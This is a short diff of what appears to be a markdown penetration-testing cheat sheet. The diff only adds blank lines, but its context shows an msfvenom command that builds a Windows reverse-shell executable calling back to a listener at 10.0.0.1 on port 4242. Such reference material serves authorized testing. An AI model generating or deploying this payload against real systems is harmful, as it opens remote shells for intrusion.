@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:25.582968+00:00'
 ```powershell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
 ```
+
+
